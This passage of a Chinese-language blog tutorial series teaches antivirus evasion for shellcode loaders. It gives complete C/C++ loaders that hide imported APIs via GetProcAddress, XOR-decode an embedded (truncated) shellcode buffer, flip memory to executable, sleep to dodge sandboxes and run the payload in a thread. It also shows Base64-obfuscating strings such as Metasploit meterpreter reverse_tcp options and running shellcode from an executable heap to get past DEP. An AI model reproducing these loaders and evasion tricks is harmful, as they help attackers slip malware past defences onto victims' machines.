<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WINAPI      __stdcall</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(FAR WINAPI *FARPROC)</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>



<p>跟进它的声明能够发现是一个函数指针，也就是说<code>GetProcAddress</code>返回的是我们要找的函数地址。</p>
<h2 id="自己写代码获取函数地址"><a href="#自己写代码获取函数地址" class="headerlink" title="自己写代码获取函数地址"></a>自己写代码获取函数地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VirtualAlloc -&gt; VirtualProtect -&gt; CreateThread -&gt; WaitForSingleObject</span><br></pre></td></tr></table></figure>

<p>这几个函数是比较明显的，并且都在<code>kernel32.dll</code>中导出，我们尝试自己定义他们的函数指针，然后利用<code>GetProcAddress</code>获取函数地址，调用自己的函数名称。</p>
<p>新建C/C++项目</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">LPVOID</span><span class="params">(WINAPI* ImportVirtualAlloc)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">	SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD  flProtect</span></span></span><br><span class="line"><span class="function"><span class="params">	)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* ImportCreateThread)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">	SIZE_T                  dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPTHREAD_START_ROUTINE  lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">	__drv_aliasesMem LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD                   dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPDWORD                 lpThreadId)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* ImportVirtualProtect)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">	SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="function"><span class="params">	PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="function"><span class="params">	)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span> <span class="params">(WINAPI * ImportWaitForSingleObject)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<p>然后在<code>main</code>函数中，定义四个函数指针来存放这些函数的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">ImportCreateThread MyCreateThread = (ImportCreateThread)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">ImportVirtualProtect MyVirtualProtect = (ImportVirtualProtect)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">ImportWaitForSingleObject MyWaitForSingleObject = (ImportWaitForSingleObject)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>完整代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinBase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">LPVOID</span><span class="params">(WINAPI* ImportVirtualAlloc)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">	SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD  flProtect</span></span></span><br><span class="line"><span class="function"><span class="params">	)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* ImportCreateThread)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">	SIZE_T                  dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPTHREAD_START_ROUTINE  lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">	__drv_aliasesMem LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD                   dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPDWORD                 lpThreadId)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* ImportVirtualProtect)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">	SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="function"><span class="params">	PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="function"><span class="params">	)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* ImportWaitForSingleObject)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	HANDLE hHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD  dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">	)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">	ImportCreateThread MyCreateThread = (ImportCreateThread)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">	ImportVirtualProtect MyVirtualProtect = (ImportVirtualProtect)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">	ImportWaitForSingleObject MyWaitForSingleObject = (ImportWaitForSingleObject)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">	DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">	HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">	DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line"><span class="comment">/* length: 800 bytes */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a...&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取shellcode大小</span></span><br><span class="line">	shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 增加异或代码 */</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++) &#123;</span><br><span class="line">		<span class="comment">//Sleep(50);</span></span><br><span class="line">		_InterlockedXor8(buf + i, <span class="number">10</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	VirtualAlloc(</span></span><br><span class="line"><span class="comment">		NULL, // 基址</span></span><br><span class="line"><span class="comment">		800,  // 大小</span></span><br><span class="line"><span class="comment">		MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">		PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">		);</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)MyVirtualAlloc(</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		shellcode_size,</span><br><span class="line">		MEM_COMMIT,</span><br><span class="line">		PAGE_READWRITE <span class="comment">// 只申请可读可写</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 将shellcode复制到可读可写的内存页中</span></span><br><span class="line">	CopyMemory(shellcode, buf, shellcode_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">	MyVirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span></span><br><span class="line">	Sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">	hThread = MyCreateThread(</span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">		(LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">		&amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	MyWaitForSingleObject(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210220162832.png"></p>
<h1 id="第八课"><a href="#第八课" class="headerlink" title="第八课"></a>第八课</h1><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>一般情况下，C/C++程序中的<strong>字符串常量会被硬编码到程序中（.data段，也就是数据段）</strong>，尤其是全局变量最容易被定位到。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> global_string[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s \n&quot;</span>, global_string);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果编写的是一些敏感参数的工具，很容易会被提取出特征，例如lcx这款工具，它的参数如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Usage of Packet Transmit:]</span><br><span class="line"></span><br><span class="line">lcx -&lt;listen|tran|slave&gt; &lt;option&gt; [-log logfile]</span><br><span class="line"></span><br><span class="line">[option:]</span><br><span class="line"></span><br><span class="line"> -listen &lt;ConnectPort&gt; &lt;TransmitPort&gt;</span><br><span class="line"> -tran&lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span><br><span class="line"> -slave &lt;ConnectHost&gt; &lt;ConnectPort&gt; &lt;TransmitHost&gt;&lt;TransmitPort&gt;</span><br></pre></td></tr></table></figure>

<p>其中，<code>-listen</code>、<code>-tran</code>、<code>-slave</code>非常敏感，一般常见程序不会高频使用这些参数名，因此落地被杀也是意料之中。</p>
<h2 id="C-重载运算符"><a href="#C-重载运算符" class="headerlink" title="C++ 重载运算符"></a>C++ 重载运算符</h2><p>C++ 允许在同一作用域中的某个函数和运算符指定多个定义，分别称为函数重载和运算符重载。</p>
<p>重载的运算符是带有特殊名称的函数，函数名是由关键字 operator 和其后要重载的运算符符号构成的。与其他函数一样，重载运算符有一个返回类型和一个参数列表。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadString</span> &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	DWORD dwStrLength = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">string</span> szOutStr;</span><br><span class="line">	<span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">Base64decode</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> szBase64String, LPDWORD lpdwLen)</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	BadString(<span class="built_in">std</span>::<span class="built_in">string</span> szInStr);</span><br><span class="line">	<span class="function"><span class="keyword">operator</span> <span class="title">std::string</span><span class="params">()</span></span>;</span><br><span class="line">	~BadString();</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include &quot;BadString.h&quot;</span></span><br><span class="line"></span><br><span class="line">std::string BadString::Base64decode(std::string szBase64String, LPDWORD lpdwLen)</span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwLen;</span><br><span class="line">	DWORD dwNeed;</span><br><span class="line">	PBYTE lpBuffer = NULL;</span><br><span class="line">	dwLen = szBase64String.length();</span><br><span class="line">	dwNeed = <span class="number">0</span>;</span><br><span class="line">	CryptStringToBinaryA(szBase64String.c_str(), <span class="number">0</span>, CRYPT_STRING_BASE64, NULL, &amp;dwNeed, NULL, NULL);</span><br><span class="line">	<span class="keyword">if</span> (dwNeed)</span><br><span class="line">	&#123;</span><br><span class="line">		lpBuffer = <span class="keyword">new</span> BYTE[dwNeed + <span class="number">1</span>];</span><br><span class="line">		ZeroMemory(lpBuffer, dwNeed + <span class="number">1</span>);</span><br><span class="line">		CryptStringToBinaryA(szBase64String.c_str(), <span class="number">0</span>, CRYPT_STRING_BASE64, lpBuffer, &amp;dwNeed, NULL, NULL);</span><br><span class="line">		*lpdwLen = dwNeed;</span><br><span class="line">	&#125;</span><br><span class="line">	return std::string((PCHAR)lpBuffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BadString::BadString(std::string szInStr)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">this</span>-&gt;dwStrLength = szInStr.length();</span><br><span class="line">	<span class="keyword">this</span>-&gt;szOutStr = <span class="keyword">this</span>-&gt;Base64decode(szInStr, &amp;<span class="keyword">this</span>-&gt;dwStrLength);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BadString::operator std::string()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">this</span>-&gt;szOutStr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BadString::~BadString()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>调用方式：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;BadString.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">string</span>(BadString(<span class="string">&quot;SGVsbG8gV29ybGQK&quot;</span>)) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设一个功能函数的定义如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CCooolisMetasploit::SendPayload</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> options, <span class="built_in">std</span>::<span class="built_in">string</span> payload)</span></span></span><br></pre></td></tr></table></figure>

<p>那么，调用这个函数时，传递的<code>std::string options</code>这个字符串可能会被定位，这个时候需要在传入之前调用一个函数，进行一次解密，把解密后的字符串传入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">metasploit-&gt;add_option(CooolisString(&quot;LXAsLS1wYXlsb2Fk&quot;), msf_payload, CooolisString(&quot;UGF5bG9hZCBOYW1lLCBlLmcuIHdpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV90Y3A&#x3D;&quot;))-&gt;default_str(CooolisString(&quot;d2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX3RjcA&#x3D;&#x3D;&quot;));</span><br></pre></td></tr></table></figure>



<h1 id="第九课"><a href="#第九课" class="headerlink" title="第九课"></a>第九课</h1><h2 id="数据执行保护（DEP）"><a href="#数据执行保护（DEP）" class="headerlink" title="数据执行保护（DEP）"></a>数据执行保护（DEP）</h2><p>DEP(Data Execution Prevention)即“ 数据执行保护”，这是Windows的一项安全机制，主要用来防止病毒和其他安全威胁对系统造成破坏。 <strong>微软从Windows XP SP2引入了该技术，并一直延续到今天。</strong></p>
<hr>
<p>为什么要有DEP：</p>
<p>在Windows Xp SP2 之前的时代，缓冲区溢出漏洞利用门槛太低了，只要发现有缓冲区溢出漏洞，就可以直接稳定利用，攻击者只需要将Shellcode不断写入堆栈，然后覆盖函数返回地址，代码就可以在堆栈中执行。但堆栈的用途主要是保存寄存器现场，提供一个函数运行时的存储空间，极少数需要代码在堆栈中执行，于是微软为了缓解类似的情况，发明了DEP保护机制，用于限<strong>制某些内存页不具有可执行权限。</strong></p>
<h2 id="如何绕过DEP"><a href="#如何绕过DEP" class="headerlink" title="如何绕过DEP"></a>如何绕过DEP</h2><p><code>VirtualProtect</code>这个API能够更改内存页的属性为可执行或不可执行，对于二进制漏洞利用来说，溢出的时候，把返回地址设计为<code>VirtualProtect</code>的地址，再精心构造一个栈为调用这个API的栈，就可以改变当前栈的内存页的属性，使其从”不可执行”变成”可执行”。</p>
<h2 id="举一反三"><a href="#举一反三" class="headerlink" title="举一反三"></a>举一反三</h2><p>Shellcode执行其实也需要一个可执行的内存页，那么还有哪些API能够构造一个可执行的内存页呢？</p>
<p><code>HeapCreate</code>可以在进程中创建辅助堆栈，并且能够设置堆栈的属性：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE WINAPI <span class="title">HeapCreate</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">__in DWORD flOptions,</span></span></span><br><span class="line"><span class="function"><span class="params">__in SIZE_T dwInitialSize,</span></span></span><br><span class="line"><span class="function"><span class="params">__in SIZE_T dwMaximumSize )</span></span>;</span><br></pre></td></tr></table></figure>

<p>第一个参数<code>flOptions</code>用于修改如何在堆栈上执行各种操作。 你可以设定<code>0</code>、<code>HEAP_NO_SERIALIZE</code>、<code>HEAP_GENERATE_EXCEPTIONS</code>、<code>HEAP_CREATE_ENABLE_EXECUTE</code>或者是这些标志的组合。</p>
<ul>
<li><code>HEAP_NO_SERIALIZE</code>：对堆的访问是非独占的，如果一个线程没有完成对堆的操作，其它线程也可以进程堆操作，这个开关是非常危险的，应尽量避免使用。</li>
<li><code>HEAP_GENERATE_EXCEPTIONS</code>：当堆分配内存失败时，会抛出异常。如果不设置，则返回NULL。</li>
<li><code>HEAP_CREATE_ENALBE_EXECUTE</code>：堆中存放的内容是可以执行的代码。如果不设置，意味着堆中存放的是不可执行的数据。</li>
</ul>
<p>看到<code>HEAP_CREATE_ENALBE_EXECUTE</code>相信很多人能够恍然大悟，我们的Shellcode可以存入这个辅助堆栈中，然后创建一个线程运行它即可。</p>
<h2 id="Shellcode-执行"><a href="#Shellcode-执行" class="headerlink" title="Shellcode 执行"></a>Shellcode 执行</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> shellcode[] = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"></span><br><span class="line">	HANDLE hHep = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	PVOID Mptr = HeapAlloc(hHep, <span class="number">0</span>, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">	RtlCopyMemory(Mptr, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">	DWORD dwThreadId = <span class="number">0</span>;</span><br><span class="line">	HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)Mptr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwThreadId);</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello World!\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第十课"><a href="#第十课" class="headerlink" title="第十课"></a>第十课</h1><h2 id="UUID"><a href="#UUID" class="headerlink" title="UUID"></a>UUID</h2><p>通用唯一标识符（universally unique identifier, UUID）是一个128位的用于在计算机系统中以识别信息的数目。在Windows中也有使用GUID来标识唯一对象。 </p>
<p>Windows中的GUID 等同于 UUID, 其结构：</p>
